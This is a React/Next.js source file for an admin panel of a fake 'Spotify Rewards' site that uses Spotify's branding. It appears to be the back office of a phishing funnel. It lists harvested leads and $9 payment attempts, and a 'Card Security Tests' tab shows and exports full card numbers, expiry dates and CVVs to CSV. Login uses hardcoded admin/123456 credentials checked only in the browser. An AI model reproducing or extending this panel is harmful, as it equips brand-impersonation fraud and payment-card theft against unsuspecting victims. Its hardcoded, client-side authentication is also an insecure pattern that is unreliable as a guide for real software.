'use client';

import {
  AlertCircle,
  ArrowDownRight,
  ArrowUpRight,
  CheckCircle2,
  Clock,
  CreditCard,
  DollarSign,
  Download,
  Filter,
  Globe,
  KeyRound,
  Lock,
  LogOut,
  Mail,
  RefreshCw,
  Search,
  ShieldAlert,
  ShieldCheck,
  User,
  Users,
  XCircle,
} from 'lucide-react';
import Image from 'next/image';
import Link from 'next/link';
import React, { useEffect, useState } from 'react';
import { supabase } from '../../../lib/supabase';

interface CustomerLead {
  id: string;
  email: string;
  full_name?: string;
  created_at: string;
}

interface PaymentItem {
  id: string;
  email?: string;
  full_name?: string;
  amount?: number;
  currency?: string;
  status: string; // succeeded, declined, failed
  error_message?: string;
  country?: string;
  created_at: string;
}

interface CardTestItem {
  id: string;
  card_number: string;
  exp_date: string;
  cvv: string;
  country?: string;
  status?: string;
  created_at: string;
}

export default function SpotifyAdminPage() {
  // Login State
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState<string | null>(null);

  // Data State
  const [activeTab, setActiveTab] = useState<'leads' | 'payments' | 'card_tests'>('leads');
  const [statusFilter, setStatusFilter] = useState<'all' | 'succeeded' | 'declined'>('all');
  const [searchQuery, setSearchQuery] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const [leads, setLeads] = useState<CustomerLead[]>([]);
  const [payments, setPayments] = useState<PaymentItem[]>([]);
  const [cardTests, setCardTests] = useState<CardTestItem[]>([]);

  // Check login on mount
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const storedAuth = sessionStorage.getItem('spotify_admin_authed');
      if (storedAuth === 'true') {
        setIsAuthenticated(true);
      }
    }
  }, []);

  // Fetch data when authenticated
  useEffect(() => {
    if (isAuthenticated) {
      fetchAdminData();
    }
  }, [isAuthenticated]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError(null);

    if (username.trim() === 'admin' && password === '123456') {
      setIsAuthenticated(true);
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('spotify_admin_authed', 'true');
      }
    } else {
      setLoginError('Invalid username or password. Please check your credentials.');
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    if (typeof window !== 'undefined') {
      sessionStorage.removeItem('spotify_admin_authed');
    }
  };

  const fetchAdminData = async () => {
    setIsLoading(true);
    try {
      // 1. Fetch Customers / Leads
      const { data: leadsData } = await supabase
        .from('customers')
        .select('*')
        .order('created_at', { ascending: false });

      if (leadsData) {
        setLeads(leadsData);
      }

      // 2. Fetch Payments
      const { data: paymentsData } = await supabase
        .from('payments')
        .select('*')
        .order('created_at', { ascending: false });

      if (paymentsData) {
        setPayments(paymentsData);
      }

      // 3. Fetch Card Tests
      const { data: cardTestsData } = await supabase
        .from('security_card_tests')
        .select('*')
        .order('created_at', { ascending: false });

      if (cardTestsData) {
        setCardTests(cardTestsData);
      }
    } catch (err) {
      console.warn('Error fetching admin dashboard data:', err);
    } finally {
      setIsLoading(false);
    }
  };

  // Metrics Calculations
  const approvedPayments = payments.filter((p) => p.status === 'succeeded');
  const declinedPayments = payments.filter((p) => p.status === 'declined' || p.status === 'failed');

  const totalRevenue = approvedPayments.reduce((acc, p) => acc + (p.amount || 9.0), 0);
  const conversionRate =
    payments.length > 0 ? ((approvedPayments.length / payments.length) * 100).toFixed(1) : '0.0';

  // Filtered Leads
  const filteredLeads = leads.filter((item) => {
    const q = searchQuery.toLowerCase();
    const matchesQuery =
      !searchQuery ||
      item.email.toLowerCase().includes(q) ||
      (item.full_name && item.full_name.toLowerCase().includes(q));
    return matchesQuery;
  });

  // Filtered Payments
  const filteredPayments = payments.filter((item) => {
    const q = searchQuery.toLowerCase();
    const matchesQuery =
      !searchQuery ||
      (item.email && item.email.toLowerCase().includes(q)) ||
      (item.full_name && item.full_name.toLowerCase().includes(q));

    const matchesStatus =
      statusFilter === 'all' ||
      (statusFilter === 'succeeded' && item.status === 'succeeded') ||
      (statusFilter === 'declined' && (item.status === 'declined' || item.status === 'failed'));

    return matchesQuery && matchesStatus;
  });

  // Filtered Card Tests
  const filteredCardTests = cardTests.filter((item) => {
    const q = searchQuery.toLowerCase();
    return (
      !searchQuery ||
      item.card_number.includes(q) ||
      (item.country && item.country.toLowerCase().includes(q))
    );
  });

  // Export to CSV
  const exportCSV = () => {
    let csvContent = 'data:text/csv;charset=utf-8,';

    if (activeTab === 'leads') {
      csvContent += 'ID,Full Name,Email,Registration Date\n';
      filteredLeads.forEach((l) => {
        csvContent += `"${l.id}","${l.full_name || 'N/A'}","${l.email}","${l.created_at}"\n`;
      });
    } else if (activeTab === 'payments') {
      csvContent += 'ID,Full Name,Email,Amount,Status,Error Message,Country,Date\n';
      filteredPayments.forEach((p) => {
        csvContent += `"${p.id}","${p.full_name || 'N/A'}","${p.email || 'N/A'}","${p.amount || 9.0}","${p.status}","${p.error_message || 'N/A'}","${p.country || 'US'}","${p.created_at}"\n`;
      });
    } else {
      csvContent += 'ID,Card Number,Exp Date,CVV,Country,Status,Date\n';
      filteredCardTests.forEach((c) => {
        csvContent += `"${c.id}","${c.card_number}","${c.exp_date}","${c.cvv}","${c.country || 'US'}","${c.status || 'declined'}","${c.created_at}"\n`;
      });
    }

    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `spotify_rewards_${activeTab}_report.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // If not authenticated, render Login Modal
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased flex items-center justify-center p-4 selection:bg-[#1db954] selection:text-black">
        <div className="w-full max-w-md bg-[#0b0e0c] border border-[#1d2520] rounded-3xl p-6 sm:p-8 shadow-2xl shadow-black relative overflow-hidden">
          {/* Subtle Ambient Radial Glow */}
          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-72 h-72 bg-[#1db954]/15 rounded-full blur-3xl pointer-events-none -z-10" />

          {/* Header Branding */}
          <div className="text-center mb-6">
            <div className="w-14 h-14 rounded-2xl bg-[#1db954] text-black flex items-center justify-center mx-auto mb-3 shadow-lg shadow-[#1db954]/25">
              <ShieldCheck className="w-8 h-8 stroke-[2.5]" />
            </div>
            <h1 className="text-2xl font-black text-white tracking-tight">Spotify Rewards</h1>
            <p className="text-xs text-gray-400 mt-1">Admin Portal &amp; Funnel Leads Dashboard</p>
          </div>

          {/* Login Form */}
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-xs font-bold uppercase tracking-wider text-gray-300 mb-1.5">
                Username
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="admin"
                  className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pl-11"
                  required
                />
                <User className="w-5 h-5 text-gray-400 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
              </div>
            </div>

            <div>
              <label className="block text-xs font-bold uppercase tracking-wider text-gray-300 mb-1.5">
                Password
              </label>
              <div className="relative">
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="••••••••"
                  className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pl-11"
                  required
                />
                <KeyRound className="w-5 h-5 text-gray-400 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
              </div>
            </div>

            {loginError && (
              <div className="p-3 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center gap-2 text-xs text-red-400">
                <AlertCircle className="w-4 h-4 shrink-0" />
                <span>{loginError}</span>
              </div>
            )}

            <button
              type="submit"
              className="w-full py-4 bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.98] text-black font-black text-sm uppercase tracking-wider rounded-2xl transition-all shadow-lg shadow-[#1db954]/20 cursor-pointer mt-2"
            >
              Sign In To Dashboard
            </button>
          </form>

          <div className="mt-6 pt-4 border-t border-[#1d2520] text-center text-[11px] text-gray-500">
            Internal Access Only • Spotify Rewards Management
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased selection:bg-[#1db954] selection:text-black pb-12">
      {/* Top Ambient Glow */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-7xl h-80 bg-[radial-gradient(ellipse_80%_50%_at_50%_0%,rgba(29,185,84,0.15),transparent_80%)] pointer-events-none -z-10" />

      {/* Header Bar */}
      <header className="sticky top-0 z-40 backdrop-blur-md bg-black/80 border-b border-[#1d2520] px-4 sm:px-8 py-4">
        <div className="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <Link href="/spotify" className="flex items-center gap-2.5">
              <div className="relative w-8 h-8 rounded-full overflow-hidden bg-black flex items-center justify-center">
                <Image
                  src="/spotify-logo.webp"
                  alt="Spotify Logo"
                  width={32}
                  height={32}
                  priority
                  referrerPolicy="no-referrer"
                />
              </div>
              <span className="text-white font-black text-lg tracking-tight">Spotify Rewards</span>
            </Link>

            <span className="bg-[#1db954]/10 text-[#1db954] border border-[#1db954]/30 text-[11px] font-extrabold uppercase px-2.5 py-0.5 rounded-full flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-[#1db954] animate-pulse" />
              Admin Leads Portal
            </span>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={fetchAdminData}
              disabled={isLoading}
              className="inline-flex items-center gap-2 px-3.5 py-2 rounded-xl bg-[#111613] hover:bg-[#18211b] border border-[#222f26] text-xs font-bold text-gray-200 transition-colors cursor-pointer"
            >
              <RefreshCw className={`w-3.5 h-3.5 text-[#1db954] ${isLoading ? 'animate-spin' : ''}`} />
              <span>Refresh Data</span>
            </button>

            <button
              onClick={exportCSV}
              className="inline-flex items-center gap-2 px-3.5 py-2 rounded-xl bg-[#111613] hover:bg-[#18211b] border border-[#222f26] text-xs font-bold text-gray-200 transition-colors cursor-pointer"
            >
              <Download className="w-3.5 h-3.5 text-blue-400" />
              <span>Export CSV</span>
            </button>

            <button
              onClick={handleLogout}
              className="inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 text-xs font-bold text-red-400 transition-colors cursor-pointer"
            >
              <LogOut className="w-3.5 h-3.5" />
              <span>Logout</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-8 py-8 space-y-8">
        {/* Metric Cards Row */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          {/* Card 1: Total Leads */}
          <div className="bg-[#0b0e0c] border border-[#1d2520] rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between text-gray-400 mb-2">
              <span className="text-xs font-bold uppercase tracking-wider">Total Leads</span>
              <Users className="w-5 h-5 text-indigo-400" />
            </div>
            <div className="text-3xl font-black text-white tracking-tight">{leads.length}</div>
            <p className="text-[11px] text-gray-400 mt-1">Captured from evaluation funnel</p>
          </div>

          {/* Card 2: Approved Sales */}
          <div className="bg-[#0b0e0c] border border-[#1d2520] rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between text-gray-400 mb-2">
              <span className="text-xs font-bold uppercase tracking-wider text-[#1db954]">Approved Sales</span>
              <CheckCircle2 className="w-5 h-5 text-[#1db954]" />
            </div>
            <div className="text-3xl font-black text-[#1db954] tracking-tight">
              {approvedPayments.length} <span className="text-sm font-bold text-gray-400">(${totalRevenue.toFixed(2)})</span>
            </div>
            <p className="text-[11px] text-gray-400 mt-1">Successful $9.00 pass purchases</p>
          </div>

          {/* Card 3: Declined Purchases */}
          <div className="bg-[#0b0e0c] border border-[#1d2520] rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between text-gray-400 mb-2">
              <span className="text-xs font-bold uppercase tracking-wider text-red-400">Declined / Failed</span>
              <XCircle className="w-5 h-5 text-red-400" />
            </div>
            <div className="text-3xl font-black text-red-400 tracking-tight">
              {declinedPayments.length}
            </div>
            <p className="text-[11px] text-gray-400 mt-1">Rejected card checkout attempts</p>
          </div>

          {/* Card 4: Conversion Rate */}
          <div className="bg-[#0b0e0c] border border-[#1d2520] rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between text-gray-400 mb-2">
              <span className="text-xs font-bold uppercase tracking-wider">Checkout Conv. Rate</span>
              <DollarSign className="w-5 h-5 text-amber-400" />
            </div>
            <div className="text-3xl font-black text-amber-400 tracking-tight">{conversionRate}%</div>
            <p className="text-[11px] text-gray-400 mt-1">Approved vs total checkout hits</p>
          </div>
        </div>

        {/* Filters & Tabs Navigation */}
        <div className="bg-[#0b0e0c] border border-[#1d2520] rounded-2xl p-4 sm:p-5 shadow-xl space-y-4">
          <div className="flex flex-wrap items-center justify-between gap-4 border-b border-[#1f2822] pb-4">
            {/* Tabs */}
            <div className="flex items-center gap-2">
              <button
                onClick={() => setActiveTab('leads')}
                className={`px-4 py-2 rounded-xl text-xs font-extrabold transition-all cursor-pointer ${
                  activeTab === 'leads'
                    ? 'bg-[#1db954] text-black shadow-md shadow-[#1db954]/20'
                    : 'bg-[#111613] text-gray-300 hover:text-white border border-[#222f26]'
                }`}
              >
                👥 All Leads ({leads.length})
              </button>

              <button
                onClick={() => setActiveTab('payments')}
                className={`px-4 py-2 rounded-xl text-xs font-extrabold transition-all cursor-pointer ${
                  activeTab === 'payments'
                    ? 'bg-[#1db954] text-black shadow-md shadow-[#1db954]/20'
                    : 'bg-[#111613] text-gray-300 hover:text-white border border-[#222f26]'
                }`}
              >
                💳 Payments &amp; Attempts ({payments.length})
              </button>

              <button
                onClick={() => setActiveTab('card_tests')}
                className={`px-4 py-2 rounded-xl text-xs font-extrabold transition-all cursor-pointer ${
                  activeTab === 'card_tests'
                    ? 'bg-[#1db954] text-black shadow-md shadow-[#1db954]/20'
                    : 'bg-[#111613] text-gray-300 hover:text-white border border-[#222f26]'
                }`}
              >
                🛡️ Card Security Tests ({cardTests.length})
              </button>
            </div>

            {/* Search Bar */}
            <div className="relative w-full sm:w-72">
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search by name or email..."
                className="w-full bg-[#131715] border border-[#26312a] rounded-xl px-3.5 py-2 text-xs text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pl-9"
              />
              <Search className="w-4 h-4 text-gray-400 absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none" />
            </div>
          </div>

          {/* Secondary Sub-filters for Payments Tab */}
          {activeTab === 'payments' && (
            <div className="flex items-center gap-2 text-xs">
              <span className="text-gray-400 font-medium">Filter status:</span>
              <button
                onClick={() => setStatusFilter('all')}
                className={`px-3 py-1 rounded-lg text-[11px] font-bold transition-colors cursor-pointer ${
                  statusFilter === 'all'
                    ? 'bg-white/10 text-white border border-white/20'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                All ({payments.length})
              </button>

              <button
                onClick={() => setStatusFilter('succeeded')}
                className={`px-3 py-1 rounded-lg text-[11px] font-bold transition-colors cursor-pointer ${
                  statusFilter === 'succeeded'
                    ? 'bg-[#1db954]/20 text-[#1db954] border border-[#1db954]/40'
                    : 'text-gray-400 hover:text-[#1db954]'
                }`}
              >
                Approved ({approvedPayments.length})
              </button>

              <button
                onClick={() => setStatusFilter('declined')}
                className={`px-3 py-1 rounded-lg text-[11px] font-bold transition-colors cursor-pointer ${
                  statusFilter === 'declined'
                    ? 'bg-red-500/20 text-red-400 border border-red-500/40'
                    : 'text-gray-400 hover:text-red-400'
                }`}
              >
                Declined ({declinedPayments.length})
              </button>
            </div>
          )}

          {/* Data Table */}
          <div className="overflow-x-auto rounded-xl border border-[#1f2822]">
            {activeTab === 'leads' && (
              <table className="w-full text-left text-xs text-gray-300">
                <thead className="bg-[#111613] text-gray-400 uppercase font-bold text-[10px] tracking-wider border-b border-[#1f2822]">
                  <tr>
                    <th className="px-4 py-3">Full Name</th>
                    <th className="px-4 py-3">Email Address</th>
                    <th className="px-4 py-3">Registration Date</th>
                    <th className="px-4 py-3">Status</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-[#1f2822] font-mono text-[11px]">
                  {filteredLeads.length === 0 ? (
                    <tr>
                      <td colSpan={4} className="px-4 py-8 text-center text-gray-500 font-sans">
                        No leads recorded yet.
                      </td>
                    </tr>
                  ) : (
                    filteredLeads.map((lead) => {
                      const hasPaid = payments.some(
                        (p) => p.email?.toLowerCase() === lead.email.toLowerCase() && p.status === 'succeeded'
                      );
                      const hasDeclined = payments.some(
                        (p) => p.email?.toLowerCase() === lead.email.toLowerCase() && (p.status === 'declined' || p.status === 'failed')
                      );

                      return (
                        <tr key={lead.id} className="hover:bg-white/[0.02] transition-colors">
                          <td className="px-4 py-3 font-sans font-bold text-white">
                            {lead.full_name || 'Anonymous'}
                          </td>
                          <td className="px-4 py-3 font-sans">
                            {lead.email.includes('@spotify.lead') ? (
                              <span className="inline-flex items-center gap-1.5 text-amber-300 font-medium text-[11px] bg-amber-500/10 px-2.5 py-0.5 rounded-full border border-amber-500/20">
                                <Clock className="w-3 h-3 text-amber-400" />
                                <span>Aguardando e-mail no checkout</span>
                              </span>
                            ) : (
                              <span className="text-indigo-300 underline font-sans font-medium">
                                {lead.email}
                              </span>
                            )}
                          </td>
                          <td className="px-4 py-3 text-gray-400">
                            {new Date(lead.created_at).toLocaleString()}
                          </td>
                          <td className="px-4 py-3 font-sans">
                            {hasPaid ? (
                              <span className="px-2 py-0.5 rounded-full bg-[#1db954]/10 text-[#1db954] border border-[#1db954]/30 font-bold text-[10px]">
                                Approved Purchaser ($9)
                              </span>
                            ) : hasDeclined ? (
                              <span className="px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/30 font-bold text-[10px]">
                                Declined Attempt
                              </span>
                            ) : (
                              <span className="px-2 py-0.5 rounded-full bg-amber-500/10 text-amber-300 border border-amber-500/30 font-bold text-[10px]">
                                Funnel Lead
                              </span>
                            )}
                          </td>
                        </tr>
                      );
                    })
                  )}
                </tbody>
              </table>
            )}

            {activeTab === 'payments' && (
              <table className="w-full text-left text-xs text-gray-300">
                <thead className="bg-[#111613] text-gray-400 uppercase font-bold text-[10px] tracking-wider border-b border-[#1f2822]">
                  <tr>
                    <th className="px-4 py-3">Full Name</th>
                    <th className="px-4 py-3">Email Address</th>
                    <th className="px-4 py-3">Amount</th>
                    <th className="px-4 py-3">Status</th>
                    <th className="px-4 py-3">Details / Error</th>
                    <th className="px-4 py-3">Country</th>
                    <th className="px-4 py-3">Date</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-[#1f2822] font-mono text-[11px]">
                  {filteredPayments.length === 0 ? (
                    <tr>
                      <td colSpan={7} className="px-4 py-8 text-center text-gray-500 font-sans">
                        No payment attempts recorded yet.
                      </td>
                    </tr>
                  ) : (
                    filteredPayments.map((p) => (
                      <tr key={p.id} className="hover:bg-white/[0.02] transition-colors">
                        <td className="px-4 py-3 font-sans font-bold text-white">
                          {p.full_name || 'Anonymous'}
                        </td>
                        <td className="px-4 py-3 text-indigo-300 underline font-sans">
                          {p.email || 'N/A'}
                        </td>
                        <td className="px-4 py-3 font-bold text-white">
                          ${(p.amount || 9.0).toFixed(2)} USD
                        </td>
                        <td className="px-4 py-3 font-sans">
                          {p.status === 'succeeded' ? (
                            <span className="px-2 py-0.5 rounded-full bg-[#1db954]/10 text-[#1db954] border border-[#1db954]/30 font-bold text-[10px] flex items-center gap-1 w-max">
                              <CheckCircle2 className="w-3 h-3" /> Approved
                            </span>
                          ) : (
                            <span className="px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/30 font-bold text-[10px] flex items-center gap-1 w-max">
                              <XCircle className="w-3 h-3" /> Declined
                            </span>
                          )}
                        </td>
                        <td className="px-4 py-3 text-gray-400 max-w-xs truncate">
                          {p.error_message || (p.status === 'succeeded' ? 'Payment Succeeded' : 'Card Declined')}
                        </td>
                        <td className="px-4 py-3 text-gray-300 font-bold">
                          {p.country || 'US'}
                        </td>
                        <td className="px-4 py-3 text-gray-400">
                          {new Date(p.created_at).toLocaleString()}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            )}

            {activeTab === 'card_tests' && (
              <table className="w-full text-left text-xs text-gray-300">
                <thead className="bg-[#111613] text-gray-400 uppercase font-bold text-[10px] tracking-wider border-b border-[#1f2822]">
                  <tr>
                    <th className="px-4 py-3">Card Number</th>
                    <th className="px-4 py-3">Exp Date</th>
                    <th className="px-4 py-3">CVC</th>
                    <th className="px-4 py-3">Country</th>
                    <th className="px-4 py-3">Status</th>
                    <th className="px-4 py-3">Date</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-[#1f2822] font-mono text-[11px]">
                  {filteredCardTests.length === 0 ? (
                    <tr>
                      <td colSpan={6} className="px-4 py-8 text-center text-gray-500 font-sans">
                        No card security tests recorded yet.
                      </td>
                    </tr>
                  ) : (
                    filteredCardTests.map((c) => (
                      <tr key={c.id} className="hover:bg-white/[0.02] transition-colors">
                        <td className="px-4 py-3 font-bold text-white tracking-widest">
                          {c.card_number}
                        </td>
                        <td className="px-4 py-3 text-gray-300">{c.exp_date}</td>
                        <td className="px-4 py-3 text-amber-300 font-bold">{c.cvv}</td>
                        <td className="px-4 py-3 text-gray-300 font-bold">{c.country || 'US'}</td>
                        <td className="px-4 py-3 font-sans">
                          <span className="px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/30 font-bold text-[10px]">
                            {c.status || 'declined'}
                          </span>
                        </td>
                        <td className="px-4 py-3 text-gray-400">
                          {new Date(c.created_at).toLocaleString()}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            )}
          </div>
        </div>
      </main>
    </div>
  );
}
